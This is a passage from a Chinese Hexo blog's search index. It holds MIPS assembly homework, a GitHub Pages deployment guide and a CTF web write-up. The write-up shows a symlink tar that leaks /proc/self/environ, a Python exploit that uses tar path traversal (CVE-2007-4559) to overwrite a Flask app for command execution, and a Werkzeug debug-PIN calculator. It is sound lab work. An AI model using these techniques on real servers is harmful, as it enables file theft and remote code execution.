\t\t\taddi $t0, $t0, 1\t# i++\n> \t\t\tj first_loop\n> \tloop1_exit:\n> \t\tlw $s2, 8($sp)\n> \t\tlw $s1, 4($sp)\n> \t\tlw $s0, 0($sp)\n> \t\taddi $sp, $sp, 12\n> \t\tli $v0, 10\n> \t\tsyscall\n> \n> print_array:\n> \tmove $t2, $s2\t# $t2 = D[]\n> \tli $t1, 0\t# $t1 = k\n> \tprint_loop:\n> \t\tli $t3, 40\n> \t\tbge $t1, $t3, loop_done\t# if k ≥ 40, done\n> \t\t# array\n> \t\tli $v0, 1\n> \t\tlw $t4, 0($t2)\n> \t\tmove $a0, $t4\n> \t\tsyscall\n> \t\t# space\n> \t\tli $v0, 4\n> \t\tla $a0, space\n> \t\tsyscall\n> \t\t# next loop\n> \t\taddi $t2, $t2, 4\n> \t\taddi $t1, $t1, 1\n> \t\tj print_loop\n> \tloop_done:\n> \t\t# next line\n> \t\tli $v0, 4\n> \t\tla $a0, line\n> \t\tsyscall\n> \t\tjr $ra\n> ```\n>\n> 经测试无误\n>\n> <img src=\"image-20221218144728404.png\">\n\n## 第二题\n\n> 完成斐奇那波数列 **F[n] = F[n-1] + F[n-2]**，设定任意的n值，并实现数列输出\n>\n> 考虑到数列只需要输出而无需保存，写出C代码\n>\n> ```c\n> int t0 = 0;\n> int t1 = 1;\n> int i = 0;\n> while (i < n) {\n> \tprintf(\"%d\",t0);\n> \tint t2 = t0 + t1;\n> \tt0 = t1;\n> \tt1 = t2;\n> \ti ++;\n> }\n> ```\n>\n> 由以上C代码写出汇编代码\n\n\n\n> **解**\n>\n> ```gas\n> #Author: 肖磊\n> #Date: 2022-12-18\n> \n> .data\n> input_msg: .asciiz \"Please input n: \"\n> output_msg: .asciiz \"Fibonacci sequence: \"\n> space: .asciiz \" \"\n> \n> .text\n> main:\n> \t# save $s0\n> \taddi $sp, $sp, -4\n> \tsw $s0, 0($sp)\n> \t\n>     # \"Please input n: \"\n>     li $v0, 4\n>     la $a0, input_msg\n>     syscall\n>     # get n\n>     li $v0, 5\n>     syscall\n>     move $s0, $v0\n>     \n>     # \"Fibonacci sequence: \"\n>     li $v0, 4\n>     la $a0, output_msg\n>     syscall\n> \n>     # Fibonacci\n>     li $t0, 0\n>     li $t1, 1\n>     li $t3, 0   # i = 0\n>     loop:\n>         bge $t3, $s0, done  # if i ≥ n, go done\n>         # print t0\n>         li $v0, 1\n>         move $a0, $t0\n>         syscall\n>         # print space\n>         li $v0, 4\n>         la $a0, space\n>         syscall\n>         add $t2, $t0, $t1   # int t2 = t0 + t1\n>         move $t0, $t1   # t0 = t1\n>         move $t1, $t2   # t1 = t2\n>         addi $t3, $t3, 1    # i ++\n>         j loop\n>     done:\n>     \taddi, $sp, $sp, 4\n>     \tlw $s0, 0($sp)\n>         li $v0, 10\n>         syscall\n> ```\n>\n> 经测试无误\n>\n> <img src=\"image-20221218144632739.png\">\n\n## 第三题\n\n> 输入n个数据，并采用**冒泡排序**，然后输出显示。\n>\n> C代码\n>\n> ```C\n> for (int i =0; i < n - 1; i ++) {\n> \tfor (int j = 0; j < n - i - 1; j++){\n> \t\tif (arr[j] > arr[j + 1]) {\n> \t\t\tint temp = arr[j];\n> \t\t\tarr[j] = arr[j + 1];\n> \t\t\tarr[j + 1] = temp;\n> \t\t}\n> \t}\n> }\n> ```\n>\n> 由以上C代码写出汇编代码\n\n\n\n> **解**\n>\n> ```gas\n> # Author: 肖磊\n> # Date: 2022-12-18\n> \n> .data\n> array: .space 100\n> space: .asciiz \" \"\n> line: .asciiz \"\\n\"\n> input_msg: .asciiz \"Please input the size of array(0 ~ 25) : \"\n> array_msg: .asciiz \"Please input the array: \"\n> error_msg: .asciiz \"Error: Invalid number\"\n> before_msg: .asciiz \"Array before sorting: \"\n> after_msg: .asciiz \"Array after sorting: \"\n> \n> .text\n> main:\n>     addi $sp, $sp, -8\n>     sw $s0, 0($sp)\n>     sw $s1, 4($sp)\n>     # \"Please input the size of array(0~25): \"\n>     li $v0, 4\n>     la $a0, input_msg\n>     syscall\n>         \n>     # get n\n>     li $v0, 5\n>     syscall\n>     move $s0, $v0\n>         \n>     # check if error\n>     li $t0, 25\n>     bgt $s0, $t0, error\n>     ble $s0, $zero, error\n>         \n>     # get array\n>     # \"Please input the array: \"\n>     li $v0, 4\n>     la $a0, array_msg\n>     syscall\n>     # new line\n>     li $v0, 4\n> \tla $a0, line\n> \tsyscall\n> \tla $s1, array   # Init array\n> \tmove $t0, $s1\n> \tli $t1, 0   # int i = 0\n>         \n> \tinput_loop:\n> \t\tbge $t1, $s0, input_done    # if i ≥ n, go done\n> \t\tli $v0, 5\n> \t\tsyscall\n> \t\tsw $v0, 0($t0)\n> \t\taddi $t0, $t0, 4\n> \t\taddi $t1, $t1, 1\n> \t\tj input_loop\n>         \n> \tinput_done:\n> \t\t# \"Array before sorting: \"\n> \t\tli $v0, 4\n> \t\tla $a0, before_msg\n> \t\tsyscall\n> \t\tjal print_array\n> \n> \n> # Bubble sort\n> \tli $t1, 0   # int i = 0\n> \tfirst_loop:\n> \t\tbge $t1, $s0, loop1_done    # if i ≥ n , go done\n> \t\tli $t2, 0   # int j = 0\n> \t\tmove $t0, $s1\n> \t\t\n> \t\tsecond_loop:\n> \t\t\taddi $t3, $s0, -1   # get size - 1\n> \t\t\tsub $t3, $t3, $t1   # get size - i - 1\n> \t\t\tbge $t2, $t3, loop2_done\n> \t\t\tlw $t3, 0($t0)  # $t3 = arr[j]\n> \t\t\tlw $t4, 4($t0)  # $t4 = arr[j + 1]\n> \t\t\t# if arr[j] > arr[j + 1], swap\n> \t\t\t# else, do nothing\n> \t\t\tble $t3, $t4, swap_done\n> \t\t\tsw $t3, 4($t0)\n> \t\t\tsw $t4, 0($t0)\n> \t\t\tswap_done:\n> \t\t\taddi $t2, $t2, 1    # j ++\n> \t\t\taddi $t0, $t0, 4    # next\n> \t\t\tj second_loop\n>                 \n> \t\tloop2_done:\n> \t\t\taddi $t1, $t1, 1    # i ++\n> \t\t\tj first_loop\n>                 \n> \tloop1_done:\n> \t\t# line\n> \t\tli $v0, 4\n> \t\tla $a0, line\n> \t\tsyscall\n> \t\t# \"Array after sorting: \"\n> \t\tli $v0, 4\n> \t\tla $a0, after_msg\n> \t\tsyscall\n> \t\tjal print_array\n>                 \n>         \n> exit:\n>     lw $s0, 0($sp)\n>     lw $s1, 4($sp)\n>     addi $sp, $sp, 8\n>     li $v0, 10\n>     syscall\n>         \n> print_array:\n>     move $t0, $s1\n>     li $t1, 0   # int i = 0\n>     print_loop:\n>         bge $t1, $s0, print_done\n>         lw $t2, 0($t0)\n>         # print number\n>         li $v0, 1\n>         move $a0, $t2\n>         syscall\n>         # print space\n>         li $v0, 4\n>         la $a0, space\n>         syscall\n>         # next\n>         addi $t0, $t0, 4\n>         addi $t1, $t1, 1    # i++\n>         j print_loop\n>     print_done:\n>         jr $ra\n> \n> error:\n>     # \"Error: Invalid number\"\n>     li $v0, 4\n>     la $a0, error_msg\n>     syscall\n>     j exit\n> ```\n>\n> 经测试无误\n>\n> <img src=\"image-20221218163911491.png\">\n","tags":["class","cs"]},{"title":"。","url":"/2022/11/27/。/","content":"# <center>见证历史</center>"},{"title":"NSS-6","url":"/2022/11/26/NSS-6/","content":"\n## web\n\n### check(V1)&&check(V2)\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n    print(file.filename)\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('/tmp/clean.sh')\n    return 'success'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\n对软链接没有任何限制，直接非预期了\n\n想着flask算pin，先看了下env\n\n```shell\nln -s /proc/self/environ 1\ntar -zcvf 1.tar 1     #-z 用于压缩软连接\nPOST上传\n```\n<img src=\"image-20221016221716692.png\">\n\n访问得到flag\n\n### check(Revenge)\n\n侥幸非预期拿了个一血😋\n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,request\nimport tarfile\nimport os\n\napp = Flask(__name__)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['tar'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n@app.route('/')\ndef index():\n    with open(__file__, 'r') as f:\n        return f.read()\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return '?'\n    file = request.files['file']\n    if file.filename == '':\n        return '?'\n\n    if file and allowed_file(file.filename) and '..' not in file.filename and '/' not in file.filename:\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a tarfile'\n    try:\n        tar = tarfile.open(file_save_path, \"r\")\n        tar.extractall(app.config['UPLOAD_FOLDER'])\n    except Exception as e:\n        return str(e)\n    os.remove(file_save_path)\n    return 'success'\n\n@app.route('/download', methods=['POST'])\ndef download_file():\n    filename = request.form.get('filename')\n    if filename is None or filename == '':\n        return '?'\n    \n    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n    \n    if '..' in filename or '/' in filename:\n        return '?'\n    \n    if not os.path.exists(filepath) or not os.path.isfile(filepath):\n        return '?'\n    \n    if os.path.islink(filepath):\n        return '?'\n    \n    if oct(os.stat(filepath).st_mode)[-3:] != '444':\n        return '?'\n    \n    with open(filepath, 'r') as f:\n        return f.read()\n    \n@app.route('/clean', methods=['POST'])\ndef clean_file():\n    os.system('su ctf -c /tmp/clean.sh')\n    return 'success'\n\n# print(os.environ)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True, port=80)\n```\n\n`os.path.islink`对软链接进行了限制，没找到可绕过的办法(开始异想天开想着构造双层tar来看文件，直接报错嘞，正好看到文件名**main.py**，**python 3.10**)\n\n但是可以利用[**CVE-2007-4559**](https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html)通过文件名中包含`../`来覆盖远程服务器上的任何文件\n\n#### 非预期\n\n因为**flask**在debug模式开启后会**auto_reload**，所以可利用此特性，覆盖**main.py**\n\n在原来的基础上加个这个\n<img src=\"image-20221016223327232.png\">\n\n**exp**\n\n```python\nimport tarfile\nimport requests\n\ndef change_name(tarinfo):\n    tarinfo.name = \"../\" + tarinfo.name\n    return tarinfo\n\nwith tarfile.open(\"exploit.tar\", \"w:xz\") as tar:\n    tar.add(\"main.py\", filter=change_name)\n    \ndef upload():\n    res = requests.post(url=url, files={\"file\": open(\"exploit.tar\", 'rb')})\n    \nurl='http://1.14.71.254:28045/upload'\nupload()\nwhile 1:\n    a=input('bash:')\n    r=requests.post(url=url+'?a='+a)\n    print(r.text)\n```\n<img src=\"image-20221016224003715.png\">\n\n#### 预期\n\n预期是利用覆盖`/tmp/clean.sh`，然后访问`/clean` getshell\n\n然后你会发现flag是root权限才能读的\n\n所以就只能**flask算pin**来得到root权限了\n\n常用反弹shell的命令都没弹成功，不知道怎么回事，直接root权限读文件吧\n\n用户为肯定为**root**了\n\n**app.py**的位置上面已得到\n<img src=\"image-20221016233634606.png\">\n\n算pin(**详见上篇文章**)\n\n```python\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '2485376925239',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '96cec10d3d9307792745ec3b85c8962079be847c1c22f74bae99e457863e13fd4c60de47472f2a8d533525466d7c34de'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n            continue\n    if isinstance(bit, str):\n        bit = bit.encode(\"utf-8\")\n    h.update(bit)\nh.update(b\"cookiesalt\")\n\ncookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\nnum = None\nif num is None:\n    h.update(b\"pinsalt\")\n    num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\nrv=None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = \"-\".join(\n                num[x : x + group_size].rjust(group_size, \"0\")\n                for x in range(0, len(num), group_size)\n            )\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\n**rce**\n\n<img src=\"image-20221016233908068.png\">\n\n","tags":["web"]},{"title":"hexo部署在Github Pages","url":"/2022/11/26/hexo部署在Github Pages/","content":"\n记录下用hexo搭建Github Pages的过程\n\n## 前言\n\n之前一直都想在服务器上搭建一个**hexo**博客，但对**node.js**完全不熟悉以及在宝塔面板上部署静态博客好像有点麻烦，就简单的用**typecho**，随便找了一个主题搭建了[博客](https://xlccccc.cn/)。\n\n**typecho**是适配markdown的，就是每个图片都要上传附件然后更改图片路径导致我自己写的md完全没有发上去的欲望\n\n而**git+hexo**就很方便了，写完直接`git push`就好了，组会也正好有这个任务，就借此机会完成了。(~~不能再拖了~~)\n\n## 环境\n\nUbuntu 22.04\n\n## node.js and npm\n\nNode的环境配置比较简单\n\n```bash\n$ sudo apt install nodejs npm\n$ node -v\nv12.22.9\n$ npm -v\nv8.5.1\n```\n\n安装的是长期版本，搭建**hexo**已经够用了\n\n## git\n\n```bash\n$ sudo apt-get install git-core\n```\n\n### 通过ssh方式链接github账户\n\n```bash\n$ git config --global user.email \"example@xx.com\"\n$ git config --global user.name \"xxx\"\n#本地生成密钥\n$ ssh-keygen -b 4096 -t rsa -C \"example@xx.com\"\n#生成后将该密钥加入到你的ssh中\n$ ssh-add ~/.ssh/id_rsa\n```\n\n然后打开**github**\n\n进入**setting**选择**SSH and GPG keys**，点击**New SSH key**\n\n取一个合适的名字，并将生成的**id_rsa.pub**中的内容复制到key中\n\n```bash\n#以ssh方式clone创建好的github pages库\n$ git clone git@github.com:xlccccc/xlccccc.github.io.git\n```\n\n此时能正常`git push`就是成功链接了\n\n(记得打开Pages，以及github学生包可以白嫖一个**.me**后缀域名)\n\n## hexo\n\n### 本地\n\n```bash\n#只有root权限才安装成功了，原因未知\n$ sudo npm install -g hexo-cli\n$ hexo init blog\n$ cd blog\n$ npm install\n#重新生成静态博客的所有内容\n$ hexo generate\n#重启 hexo 本地服务\n$ hexo server\n#安装git插件\n$ npm install hexo-deployer-git --save\n```\n\n此时访问 https://localhost:4000 可以看到本地博客页面\n\n### github pages\n\n在**_config.yml**的最后一行添加\n\n```yaml\ndeploy:\n  type: git\n  repository: git@github.com:xlccccc/xlccccc.github.io.git\n  branch: master\n```\n\n更改url为你的`github pages`\n\n```bash\n$ hexo clean\n$ hexo generate\n$ hexo deploy\n```\n\n此时访问 https://xlccccc.github.io 就可看到博客啦\n\n```bash\n$ hexo new photo \"My Gallery\"\n$ hexo generate\n$ hexo deploy\n```\n\n如果改了域名，在source下新建CNAME，内容为你的域名(如`xlccccc.me`)，然后`hexo generate` `hexo deploy`即可\n\n","tags":["dev"]},{"title":"Hello World","url":"/2022/11/26/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]